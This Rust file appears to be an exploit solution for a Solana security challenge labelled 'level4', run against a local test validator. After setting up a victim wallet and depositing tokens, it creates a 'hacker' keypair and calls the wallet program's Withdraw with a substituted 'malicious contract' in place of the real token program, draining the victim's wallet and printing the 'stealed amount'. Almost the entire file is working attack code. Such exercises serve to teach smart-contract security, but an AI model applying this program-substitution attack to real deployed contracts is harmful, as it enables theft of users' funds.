#![allow(warnings)]

use solana_client::rpc_client::RpcClient;

use solana_program::{
        pubkey::Pubkey,
        instruction::{AccountMeta, Instruction},
        sysvar::rent::id as rent_id,
        program_pack::Pack,
    };
use solana_sdk::{
        system_program,
        signature::{Keypair, read_keypair_file}, 
        signer::Signer, 
        commitment_config::CommitmentConfig,
        transaction::Transaction,
        native_token::LAMPORTS_PER_SOL,
    };

use spl_token::{
        state::{Account, Mint}, instruction::initialize_account,
    };
use spl_associated_token_account:: {
    instruction::create_associated_token_account,
    get_associated_token_address,
};

use owo_colors::OwoColorize;
use borsh::{BorshDeserialize, BorshSerialize};

#[derive(Debug, BorshDeserialize, BorshSerialize)]
    pub enum WalletInstruction {
        Initialize,
        Deposit { amount: u64 },
        Withdraw { amount: u64 },
    }

    pub fn get_wallet_address(owner: &Pubkey, wallet_program: &Pubkey) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[&owner.to_bytes()], wallet_program)
    }

    pub fn get_authority(wallet_program: &Pubkey) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[], wallet_program)
    }


fn main() {

        //setup_logging(LogLevel::TRACE);
        let programa_keypair = read_keypair_file("./target/so/level4-keypair.json").unwrap();
        let programa = programa_keypair.pubkey();

        let cliente1 = String::from("http://localhost:8899");
        
        let payer = Keypair::new();
        let mint_account = Keypair::new();

        println!("Creating the RpcClient and airdropping");
        
    
        let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());

        match env.request_airdrop(&payer.pubkey(), LAMPORTS_PER_SOL * 100) {
            Ok(sig) => loop {
                if let Ok(confirmed) = env.confirm_transaction(&sig) {
                    if confirmed {
                        println!("Transaction: {} Status: {}", sig, confirmed);
                        break;
                    }
                }
            },
            Err(_) => println!("Error requesting airdrop"),
        };

        let (wallet_pda, _) = get_wallet_address(&payer.pubkey(), &programa);
        let (program_pda, _) = get_authority(&programa);

        let rent_exemption_amount :u64 = env.get_minimum_balance_for_rent_exemption(Mint::LEN).unwrap();


        println!("Creating and initializing mint account");
        let instructions  = vec! [

            solana_program::system_instruction::create_account(
            &payer.pubkey(),
            &mint_account.pubkey(),
            rent_exemption_amount,
            Mint::LEN as u64, // 82
            &spl_token::id(),
        ),
    
        spl_token::instruction::initialize_mint(
            &spl_token::id(),
            &mint_account.pubkey(),
            &payer.pubkey(),
            None,
            9,
        )
        .unwrap(),
        ];

        let recent_blockhash = env.get_latest_blockhash().unwrap();
    
        let tx = Transaction::new_signed_with_payer(
            &instructions,
            Some(&payer.pubkey()),
            &[&payer, &mint_account],
            recent_blockhash,
        );
    
        env.send_and_confirm_transaction(&tx).unwrap();   
        
        println!("Initializing Wallet PDA");

            let tx_init = Instruction {
                program_id: programa,
                accounts: vec![
                    AccountMeta::new(wallet_pda, false),
                    AccountMeta::new_readonly(program_pda, false),
                    AccountMeta::new(payer.pubkey(), true),
                    AccountMeta::new(mint_account.pubkey(), false),
                    AccountMeta::new_readonly(rent_id(), false),
                    AccountMeta::new_readonly(spl_token::id(), false),
                    AccountMeta::new_readonly(system_program::id(), false),
                ],
                data: WalletInstruction::Initialize.try_to_vec().unwrap(),
            };

        let recent_blockhash = env.get_latest_blockhash().unwrap();
    
            
        let tx_init = Transaction::new_signed_with_payer(
            &[tx_init],
            Some(&payer.pubkey()),
            &[&payer],
            recent_blockhash,
        );
            
        env.send_and_confirm_transaction(&tx_init).unwrap();


        // Creating ATA owner and ATA wallet
        let ata_account = Keypair::new();

        let ata_create_tx = solana_program::system_instruction::create_account(
            &payer.pubkey(),
            &ata_account.pubkey(),
            LAMPORTS_PER_SOL,
            Account::LEN as u64, 
            &spl_token::ID,
        );

        let ata_tx = create_associated_token_account(
            &payer.pubkey(),
            &ata_account.pubkey(),
            &mint_account.pubkey(),
            &spl_token::ID,
        );
    
        let ata_init = initialize_account(
            &spl_token::ID, 
            &ata_account.pubkey(), 
            &mint_account.pubkey(), 
            &payer.pubkey()).unwrap();
            
        let recent_blockhash = env.get_latest_blockhash().unwrap();
    
    
        let ata_tx = Transaction::new_signed_with_payer(
            &[ata_create_tx, ata_tx, ata_init],
            Some(&payer.pubkey()),
            &[&payer, &ata_account],
            recent_blockhash,
        );

        env.send_and_confirm_transaction(&ata_tx).unwrap();


        env.request_airdrop(&ata_account.pubkey(), LAMPORTS_PER_SOL * 3);
        let ata_token = get_associated_token_address(
            &ata_account.pubkey(),
            &mint_account.pubkey(),
        );

        let mint_to_ix = spl_token::instruction::mint_to(
            &spl_token::ID,
            &mint_account.pubkey(),
            &ata_token,
            &payer.pubkey(),
            &[], 
            LAMPORTS_PER_SOL,
        )
        .unwrap();
    
        let recent_blockhash = env.get_latest_blockhash().unwrap();
    
        let mint_to_tx = Transaction::new_signed_with_payer(
            &[mint_to_ix],
            Some(&payer.pubkey()),
            &[&payer],
            recent_blockhash,
        );
    
        env.send_and_confirm_transaction(&mint_to_tx).unwrap();

        let ata_tok_data = env.get_account(&ata_token).unwrap().data;

        println!("Depositing 10000");

        let tx_create = 
            Instruction {
                program_id: programa,
                accounts: vec![
                    AccountMeta::new(wallet_pda, false),
                    AccountMeta::new(ata_token, false),
                    AccountMeta::new_readonly(ata_account.pubkey(), true),
                    AccountMeta::new_readonly(mint_account.pubkey(), true),
                    AccountMeta::new_readonly(spl_token::id(), false),
                ],
                data: WalletInstruction::Deposit { amount: 10000 }.try_to_vec().unwrap(),
        };
    
        let recent_blockhash = env.get_latest_blockhash().unwrap();
    
        let tx_create = Transaction::new_signed_with_payer(
            &[tx_create],
            Some(&payer.pubkey()),
            &[&payer, &ata_account, &mint_account],
            recent_blockhash,
        );
            
        env.send_and_confirm_transaction(&tx_create).unwrap();

        let prog_pda_data = env.get_account(&wallet_pda).unwrap().data;
        let wall_amount_orig = Account::unpack(&prog_pda_data).unwrap().amount;
    
        let hacker = Keypair::new();

        match env.request_airdrop(&hacker.pubkey(), LAMPORTS_PER_SOL * 100) {
            Ok(sig) => loop {
                if let Ok(confirmed) = env.confirm_transaction(&sig) {
                    if confirmed {
                        println!("Transaction: {} Status: {}", sig, confirmed);
                        break;
                    }
                }
            },
            Err(_) => println!("Error requesting airdrop"),
        };

        let (hack_wallet, _) = get_wallet_address(&hacker.pubkey(), &programa);

        println!("Stealing lamports");

        let hack_init = Instruction {
            program_id: programa,
            accounts: vec![
                AccountMeta::new(hack_wallet, false),
                AccountMeta::new_readonly(program_pda, false),
                AccountMeta::new(hacker.pubkey(), true),
                AccountMeta::new(mint_account.pubkey(), false),
                AccountMeta::new_readonly(rent_id(), false),
                AccountMeta::new_readonly(spl_token::id(), false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: WalletInstruction::Initialize.try_to_vec().unwrap(),
        };

        let recent_blockhash = env.get_latest_blockhash().unwrap();

    
        let hack_init = Transaction::new_signed_with_payer(
            &[hack_init],
            Some(&hacker.pubkey()),
            &[&hacker],
            recent_blockhash,
        );
    
        env.send_and_confirm_transaction(&hack_init).unwrap();

        let hack_amount_1 = env.get_account(&hack_wallet).unwrap().data;
        let hack_amount_orig= Account::unpack(&hack_amount_1).unwrap().amount;

        //Deploy the malicious contract
        let myspl_keypair = read_keypair_file("./target/so/myspl-keypair.json").unwrap();
        let myspl = myspl_keypair.pubkey();

        
        let hack_tx = Instruction {
            program_id: programa,
            accounts: vec![
                AccountMeta::new(hack_wallet, false),
                AccountMeta::new_readonly(program_pda, false),
                AccountMeta::new_readonly(hacker.pubkey(), true),
                AccountMeta::new(wallet_pda, false),
                AccountMeta::new_readonly(spl_token::ID, false),
                AccountMeta::new_readonly(myspl, false),
            ],
            data: WalletInstruction::Withdraw { amount: 10000 }.try_to_vec().unwrap(),
        };
        

        let recent_blockhash = env.get_latest_blockhash().unwrap();

        
        let hack = Transaction::new_signed_with_payer(
            &[hack_tx],
            Some(&hacker.pubkey()),
            &[&hacker],
            recent_blockhash,
        );
        
        env.send_and_confirm_transaction(&hack).unwrap();

        let prog_pda_data_2 = env.get_account(&wallet_pda).unwrap().data;
        let wall_amount_final= Account::unpack(&prog_pda_data_2).unwrap().amount;
        let hack_amount_1 = env.get_account(&hack_wallet).unwrap().data;
        let hack_amount_final= Account::unpack(&hack_amount_1).unwrap().amount;

        if wall_amount_orig > wall_amount_final && hack_amount_final > hack_amount_orig {
            println!("{} {:?}", "[*Hax*] stealed amount:".blue().bold(), hack_amount_final.blue().on_yellow()); } 
            else { println!("Something went wroing! :(") }
    
}

